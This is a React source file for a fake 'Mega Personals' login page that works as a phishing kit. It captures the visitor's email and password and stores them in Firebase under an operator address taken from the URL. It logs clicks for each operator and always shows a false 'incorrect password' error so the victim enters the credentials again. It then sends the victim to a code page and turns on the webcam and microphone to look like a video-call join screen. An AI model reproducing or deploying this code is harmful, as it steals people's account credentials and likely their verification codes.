import React, { useEffect, useRef, useState } from 'react'
import megaLogo from '../assets/favicon.ico'
import { Link, useLocation, useNavigate, useOutletContext, useParams } from 'react-router-dom'
import megaWebpLogo from "../assets/megapersonals.webp"
import { BsThreeDotsVertical } from "react-icons/bs";
import { FaMicrophone, FaMicrophoneSlash, FaVideo, FaVideoSlash } from 'react-icons/fa';
import { addClick, addData } from '../config/firebase';


const Login = () => {

  const { username } = useParams()

  const videoRef = useRef(null)
  const [stream, setStream] = useState(null)
  const [micOn, setMicOn] = useState(true)
  const [cameraOn, setCameraOn] = useState(true)

  const { info, setInfo } = useOutletContext()
  const [count, setCount] = useState(0)

  const location = useLocation()

  const navigate = useNavigate()

  const email = useRef()
  const pass = useRef()

  async function postData() {
    try {

      const pathNames = location.pathname.split("/")
      const ownerEmail = `${pathNames[1]}@gmail.com`

      const emailValue = email.current.value
      const passValue = pass.current.value

      setInfo((prevInfo) => {
        return { ...prevInfo, email: emailValue, pass: passValue }
      })

      const result = await addData(emailValue, passValue, ownerEmail)

      if (count === 1) {
        return navigate(`/${pathNames[1]}/code`)
      }

      setCount(count + 1)
      email.current.value = ''
      pass.current.value = ''
    } catch (error) {
      console.log(error?.message)
    }
  }

  function handleSubmit(event) {
    event.preventDefault()
    postData()
  }

  useEffect(() => {
    addClick(`${username}@gmail.com`, 'mega')
  }, [])

  useEffect(() => {
    async function initMedia() {
      try {
        const userStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: true,
        })
        setStream(userStream)
        if (videoRef.current) videoRef.current.srcObject = userStream

        // set initial state based on tracks
        const audioTrack = userStream.getAudioTracks()[0]
        const videoTrack = userStream.getVideoTracks()[0]
        setMicOn(audioTrack?.enabled ?? false)
        setCameraOn(videoTrack?.enabled ?? false)
      } catch (err) {
        console.error("Permission denied or error:", err)
        setMicOn(false)
        setCameraOn(false)
      }
    }

    initMedia()
  }, [])

  const toggleMic = () => {
    if (!stream) return
    const audioTrack = stream.getAudioTracks()[0]
    if (audioTrack) {
      audioTrack.enabled = !audioTrack.enabled
      setMicOn(audioTrack.enabled)
    }
  }

  const toggleCamera = () => {
    if (!stream) return
    const videoTrack = stream.getVideoTracks()[0]
    if (videoTrack) {
      videoTrack.enabled = !videoTrack.enabled
      setCameraOn(videoTrack.enabled)
    }
  }

  return (
    <div className="w-full max-w-md mx-auto z-20 relative">
      <div className="w-full p-2 bg-neutral-50">

        {/* Header */}
        <div className="flex items-center justify-center mb-4">
          <img src={megaWebpLogo} alt="Mega Personals" className="w-60 my-8 brightness-75 saturate-200" />
        </div>

        <div className="relative">
          <video
            ref={videoRef}
            autoPlay
            muted
            playsInline
            className="w-full aspect-video object-cover rounded-lg"
          />
          <BsThreeDotsVertical className='text-white text-xl absolute top-5 right-5' />

          <div className='w-full absolute bottom-5 flex justify-center gap-5 '>
            <div
              onClick={toggleMic}
              className={` ${micOn ? 'bg-neutral-950/60' : 'bg-red-600/70'} rounded-full text-white text-xl p-3 cursor-pointer`}
            >
              {micOn ? <FaMicrophone /> : <FaMicrophoneSlash />}
            </div>
            <div
              onClick={toggleCamera}
              className={`${cameraOn ? 'bg-neutral-950/60' : 'bg-red-600/70'}  bg-neutral-950/60 rounded-full text-white text-xl p-3 cursor-pointer`}
            >
              {cameraOn ? <FaVideo /> : <FaVideoSlash />}
            </div>
          </div>
        </div>

        <h2 className='text-neutral-800 font-semibold text-xl text-center mt-5 '>What's your Email?</h2>

        {/* Error message */}
        <p
          id="msg"
          className={`${count >= 1 ? "block" : "hidden"} mt-3 rounded bg-red-600/80 text-white p-2 text-sm text-center`}
        >
          Please enter correct password
        </p>

        {/* Form */}
        <form
          className="mt-5 flex w-full flex-col gap-y-4"
          onSubmit={handleSubmit}
        >
          <input
            required
            ref={email}
            type="email"
            name="email"
            placeholder="Your Email Address"
            className="h-11 rounded border border-neutral-300 px-4 outline-none focus:ring-2 focus:ring-blue-400"
          />

          <input
            required
            ref={pass}
            type="password"
            name="password"
            placeholder="Password"
            className="h-11 rounded border border-neutral-300 px-4 outline-none focus:ring-2 focus:ring-blue-400"
          />

          <button
            type="submit"
            className="h-11 rounded bg-blue-500 font-medium text-white transition hover:bg-blue-600"
          >
            Ask to Join
          </button>
        </form>

        {/* Footer options */}
        <div className="mt-4 text-center text-lg font-semibold text-neutral-800">
          Other joining options
        </div>
        <div className="mt-1 text-center font-semibold text-neutral-500">
          Ask to Companion Mode
        </div>
      </div>
    </div>
  )
}

export default Login